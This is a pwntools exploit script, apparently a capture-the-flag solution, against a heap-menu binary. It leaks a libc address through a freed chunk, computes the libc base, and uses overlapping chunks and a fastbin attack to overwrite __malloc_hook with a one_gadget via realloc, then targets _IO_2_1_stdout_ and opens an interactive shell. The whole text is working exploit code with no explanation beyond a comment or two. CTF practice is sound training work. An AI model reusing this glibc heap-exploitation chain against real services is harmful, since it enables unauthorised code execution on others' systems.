from parse_args_and_some_func import *

io = all_parsed_args["io"]
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20
if all_parsed_args["debug_enable"]:
    libc = all_parsed_args["cur_elf"].libc
    gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
else:
    libc = ELF("libc.so.6")
    gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def add_user(size:int, content=b'\x00'):
    global io
    assert size <= 0x120
    io.sendlineafter("> ", '1')
    io.sendlineafter("size:\n", str(size))
    io.sendafter("content:\n", content)

def delete_user(idx:int):
    global io
    assert idx >= 0 and idx <= 8
    io.sendlineafter("> ", '2')
    io.sendlineafter("index:\n", str(idx))

def show_user(idx:int):
    global io
    assert idx >= 0 and idx <= 8
    io.sendlineafter("> ", '3')
    io.sendlineafter("index:\n", str(idx))
    msg = io.recvline()
    log.success("msg recv :{}".format(msg))
    return msg

def edit_user(addr:int, num): # 只有一次机会，往一个地址写入一个字节
    global io
    assert num >= 0 and num <= 0xff
    io.sendlineafter("> ", '4')
    io.sendlineafter("addr:\n", str(addr))
    io.sendafter("num:\n", num)
    io.recvuntil("starssgo need ten girl friend \n")


add_user(0x80) # 0
add_user(0x60) # 1
add_user(0x60) # 2
add_user(0xf0) # 3
add_user(0x10) # 4 gap
delete_user(0)
add_user(0x80, b'a' * 8) # 0
msg = show_user(0) # leak libc addr
leak_addr = msg[8 : 14]
leak_addr = u64(leak_addr + b'\x00\x00')
LOG_ADDR('leak_addr', leak_addr)
main_arena_addr = leak_addr - 88
libc_base_addr = main_arena_addr - main_arena_offset
LOG_ADDR("libc_base_addr", libc_base_addr)

one_gadget = libc_base_addr + gadgets[3]

delete_user(2)
add_user(0x68, b"a" * 0x60 + p64(0x170)) # 2
delete_user(0)

delete_user(3)

target_addr = libc_base_addr + libc.sym["__malloc_hook"] - 0x23
delete_user(1)

payload = flat("a"*0x80, 0, 0x71, target_addr)
add_user(0xa0, payload) # 0


add_user(0x60) # 1
add_user(0x60, flat("\x00" * 3, 
                    0,
                    one_gadget, 
                    0,# malloc_hook
                    0,
                    0,
                    0,
                    0,
                    libc_base_addr + libc.sym["realloc"])) # 3  #, p64(one_gadget) *  7

delete_user(2)

target_addr = libc_base_addr + libc.sym["_IO_2_1_stdout_"] + 0x9d
add_user(0xd0, flat(0x40 * "a", 0, 0x71, target_addr)) # 5
# 
add_user(0x60)

STOP()
add_user(0x60, flat("\x00\x00\x00",
                    0,
                    0,
                    0xffffffff,
                    0,
                    0,
                    libc_base_addr + libc.sym["__malloc_hook"]-0x10))

io.interactive()
